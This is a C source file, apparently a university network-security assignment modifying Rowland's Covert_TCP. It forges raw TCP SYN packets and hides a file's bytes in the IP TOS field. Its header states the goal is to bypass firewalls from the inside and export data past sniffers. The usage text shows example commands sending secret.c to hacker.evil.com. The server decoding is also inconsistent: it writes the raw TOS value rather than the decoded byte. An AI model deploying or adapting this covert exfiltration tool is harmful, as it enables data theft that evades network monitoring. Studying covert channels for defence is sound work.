/* Covert_TCP 1.0 - Covert channel file transfer for Linux
* Written by Craig H. Rowland (crowland@psionic.com)
* MODIFIED BY HARJINDER KHATKAR A00746060
*
* Harjinder Khatkar
* A00746060
* Comp7D
* COMP8505
*
* Assignment 1
* September 23, 2012
*
* This program manipulates the TCP/IP header to transfer a file one byte
* at a time to a destination host. This progam can act as a server and a client
* and can be used to conceal transmission of data inside the IP header (TOS FIELD). 
* This is useful for bypassing firewalls from the inside, and for 
* exporting data with innocuous looking packets that contain no data for 
* sniffers to analyze. Data in the TOS field is encoded with a random number and decoded on server side.
* Also sends packets in 10 second intervals.
*
* compile: gcc -o tcp_c tcp_c.c
*/
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
//#include <linux/tcp.h>

#define VERSION "2.0"

// prototypes 
void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short,char *,int,int); 
unsigned short in_cksum(unsigned short *, int);
unsigned int host_convert(char *);
void usage(char *);

// This is the main function that takes in arguments, that decides where the 
// host is located and who the destination is. Also, based on user input, decides what
// port to send data from and to. Decides if the program should act as a server or client.
int main(int argc, char **argv)
{
   unsigned int source_host=0,dest_host=0;
   unsigned short source_port=0,dest_port=80;
   int server=0,file=0, ttl = 1;
   int count;
   char desthost[80],srchost[80],filename[80];

   /* Title */
   printf("Covert TCP using %s (c)1996 Craig H. Rowland (crowland@psionic.com) code\n",VERSION); 
   printf("\nModified by Harjinder Khatkar A00746060\n");
  
   /* Can they run this? */
   if(geteuid() !=0)
   {
    	printf("\nYou need to be root to run this.\n\n");
    	exit(0);
   }

   /* Tell them how to use this thing */
   if((argc < 6) || (argc > 13))
   {
   	usage(argv[0]);
   	exit(0);
   }

   for(count=0; count < argc; ++count)
    {
    	if (strcmp(argv[count],"-dest") == 0)
    	{
     		dest_host=host_convert(argv[count+1]); 
     		strncpy(desthost,argv[count+1],79);
    	}
    	else if (strcmp(argv[count],"-source") == 0)
    	{
     		source_host=host_convert(argv[count+1]); 
     		strncpy(srchost,argv[count+1],79);
    	}
    	else if (strcmp(argv[count],"-file") == 0)
    	{
     		strncpy(filename,argv[count+1],79);
     		file=1;
    	}
    	else if (strcmp(argv[count],"-source_port") == 0)
    	{
      	source_port=atoi(argv[count+1]);
    	}
    	else if (strcmp(argv[count],"-dest_port") == 0)
    	{
      	dest_port=atoi(argv[count+1]);
    	}
    	else if (strcmp(argv[count],"-server") == 0)
    	{
      	server=1;
    	}
    }

   /* Did they give us a filename? */
   if(file != 1)
   {
   	printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
    	exit(1);
   }

   if(server==0) /* if they want to be a client do this... */
   {   
     if (source_host == 0 && dest_host == 0)
     {
      	printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
      	exit(1);
     }
     else
     {
      	printf("Destination Host: %s\n",desthost);
      	printf("Source Host     : %s\n",srchost);
       	if(source_port == 0)
			{        		
        		printf("Originating Port: random\n");
			}       
       	else
       	{
        		printf("Originating Port: %u\n",source_port);
      		printf("Destination Port: %u\n",dest_port);
      		printf("Encoded Filename: %s\n",filename);
			}     
			  		
        	printf("Encoding Type   : TOS field\n");
       	printf("\nClient Mode: Sending data.\n\n");
     }
   }
   else /* server mode it is */
   {    
     if (source_host == 0 && source_port == 0)
     {
      	printf("You need to supply a source address and/or source port for server mode.\n");
      	exit(1);
     }
     
     if(dest_host == 0) /* if not host given, listen for anything.. */
     {
      	strcpy(desthost,"Any Host");
     }
     
     if(source_host == 0)
     {
      	strcpy(srchost,"Any Host");
     }
     
     printf("Listening for data from IP: %s\n",srchost);
     
     if(source_port == 0)
     {
      	printf("Listening for data bound for local port: Any Port\n");
     }
     else
     {
      	printf("Listening for data bound for local port: %u\n",source_port);
     }
     
     printf("Decoded Filename: %s\n",filename);
     printf("Decoding Type Is: TOS Field.\n");
     printf("\nServer Mode: Listening for data.\n\n");
   }
   /* Do the dirty work */
   forgepacket(source_host, dest_host, source_port, dest_port ,filename,server,ttl);
	exit(0);
}

// This is the function that assigns values to the IP and TCP headers.
// This is where I forge the ip header to have data in the TOS field.
// I also encode the value with a simple random value that can be decoded
// on the server side.
void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int server, int ttl)
{
	
	int ch;
	int divisor = RAND_MAX/(10);
	int randomID = rand()/divisor;
   int send_socket;
   int recv_socket;
   struct sockaddr_in sin;
   FILE *input;
   FILE *output;
   
   struct send_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
   } send_tcp;

   struct recv_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
      char buffer[10000];
   } recv_pkt;

   /* From synhose.c by knight */
   struct pseudo_header
   {
      unsigned int source_address;
      unsigned int dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcphdr tcp;
   } pseudo_header;

/* Initialize RNG for future use */
srand((getpid())*(dest_port)); 

/**********************/
/* Client code        */
/**********************/
/* are we the client? */
if(server==0)
{
	if((input=fopen(filename,"rb"))== NULL)
 	{
 		printf("I cannot open the file %s for reading\n",filename);
 		exit(1);
 	}
	else 
	{	
		while((ch=fgetc(input)) !=EOF)
 		{
 			randomID = randomID +1;
 			
			/* Delay loop. 
			sleep(1);

   		/* Make the IP header with our forged information */
   		send_tcp.ip.ihl = 5;
   		send_tcp.ip.version = 4;
   		send_tcp.ip.tos = ch + randomID;
   		send_tcp.ip.tot_len = htons(40);
	   	send_tcp.ip.id = randomID;
  			send_tcp.ip.frag_off = 0;
   		send_tcp.ip.ttl = 64;
   		send_tcp.ip.protocol = IPPROTO_TCP;
   		send_tcp.ip.check = 0;
   		send_tcp.ip.saddr = source_addr;
   		send_tcp.ip.daddr = dest_addr;

			/* begin forged TCP header */
			if(source_port == 0) /* if the didn't supply a source port, we make one */
			{
  		 		send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
  			}
			else /* otherwise use the one given */
			{
  				send_tcp.tcp.source = htons(source_port);	
  			}
  		
   		send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
   
   		/* forge destination port */
   		send_tcp.tcp.dest = htons(dest_port);
   		/* the rest of the flags */
   		send_tcp.tcp.ack_seq = 0;
   		send_tcp.tcp.res1 = 0;
   		send_tcp.tcp.doff = 5;
   		send_tcp.tcp.fin = 0;
   		send_tcp.tcp.syn = 1;
   		send_tcp.tcp.rst = 0;
   		send_tcp.tcp.psh = 0;
   		send_tcp.tcp.ack = 0;
   		send_tcp.tcp.urg = 0;
   		send_tcp.tcp.res2 = 0;
   		send_tcp.tcp.window = htons(512);
   		send_tcp.tcp.check = 0;
   		send_tcp.tcp.urg_ptr = 0;
   
   		/* Drop our forged data into the socket struct */
   		sin.sin_family = AF_INET;
   		sin.sin_port = send_tcp.tcp.source;
   		sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
   		/* Now open the raw socket for sending */
   		send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   		if(send_socket < 0)
   		{
      		perror("send socket cannot be open. Are you root?");
      		exit(1);
   		}

      	/* Make IP header checksum */
      	send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
      	/* Final preparation of the full header */

      	/* From synhose.c by knight */
      	pseudo_header.source_address = send_tcp.ip.saddr;
      	pseudo_header.dest_address = send_tcp.ip.daddr;
      	pseudo_header.placeholder = 0;
      	pseudo_header.protocol = IPPROTO_TCP;
      	pseudo_header.tcp_length = htons(20);

      	bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
      	/* Final checksum on the entire package */
      	sleep(10);
      	send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
      	
      	sendto(send_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
      	printf("Sending Data: %c\n",ch);

  			close(send_socket);
 		} /* end while(fgetc()) loop */
 		fclose(input);
 	}
	
}/* end if(server == 0) loop */

/***********************/
/* Passive server code */
/***********************/
/* we are the server so now we listen */
else
{
 	if((output=fopen(filename,"wb"))== NULL)
  	{
  		printf("I cannot open the file %s for writing\n",filename);
  		exit(1);
  	}	
	/* Now we read the socket. This is not terribly fast at this time, and has the same */
	/* reliability as UDP as we do not ACK the packets for retries if they are bad. */
	/* This is just proof of concept... CHR*/

 	while(1) /* read packet loop */
 	{
   	/* Open socket for reading */
   	recv_socket = socket(AF_INET, SOCK_RAW, 6);
   	if(recv_socket < 0)
   	{
      	perror("receive socket cannot be open. Are you root?");
      	exit(1);
   	}
  		/* Listen for return packet on a passive socket */
  		read(recv_socket, (struct recv_tcp *)&recv_pkt, 9999);

		/* if the packet has the SYN/ACK flag set and is from the right address..*/
		if (source_port == 0) /* the user does not care what port we come from */
		{       /* check for SYN/ACK flag set and correct inbound IP source address */
  			if((recv_pkt.tcp.syn == 1) && (recv_pkt.ip.saddr == source_addr)) 
   		{
        		/* IP ID header "decoding" */
        		/* The ID number is converted from it's ASCII equivalent back to normal */
				if(ttl==1)
				{
   				printf("Receiving Data: %c\n",(recv_pkt.ip.tos - recv_pkt.ip.id));
   				fprintf(output,"%c",recv_pkt.ip.tos);
   				fflush(output);
				}
        		
			} /* end if loop to check for ID/sequence decode */
		} /* End if loop checking for port number given */
		
  	 	close(recv_socket); /* close the socket so we don't hose the kernel */
  }/* end while() read packet loop */

  fclose(output);
 } /* end else(serverloop) function */

} /* end forgepacket() function */


//Function to create checksum, supplied by Rowland.
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long		sum;		/* assumes long == 32 bits */
	u_short			oddbyte;
	register u_short	answer;		/* assumes u_short == 16 bits */

	/*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nbytes == 1) {
		oddbyte = 0;		/* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
		sum += oddbyte;
	}

	/*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

	sum  = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;		/* ones-complement, then truncate to 16 bits */
	return(answer);
} //end in_cksm() 



/* Generic resolver from unknown source */
unsigned int host_convert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
} /* end resolver */

/* Tell them how to use this */
void usage(char *progname)
{
      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server \n\n", progname);
      printf("-dest dest_ip      - Host to send data to.\n");
      printf("-source source_ip  - Host where you want the data to originate from.\n");
      printf("                     In SERVER mode this is the host data will\n");
      printf("                     be coming FROM.\n");
      printf("-source_port port  - IP source port you want data to appear from. \n");
      printf("                     (randomly set by default)\n");
      printf("-dest_port port    - IP source port you want data to go to. In\n");
      printf("                     SERVER mode this is the port data will be coming\n");
      printf("                     inbound on. Port 80 by default.\n");
      printf("-file filename     - Name of the file to encode and transfer.\n");
      printf("-server            - Passive mode to allow receiving of data.\n");
      printf("\nPress ENTER for examples.");
      getchar();
      printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n");
      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
      printf("at a time using IP packet TTL encoding.\n");
      printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -dest_port 80 -server -file secret.c\n\n");
      printf("Above listens passively for packets from  hacker.evil.com\n");
      printf("destined for port 80. It takes the data and saves the file locally\n");
      printf("as secret.c\n\n");
      exit(0);
} /* end usage() */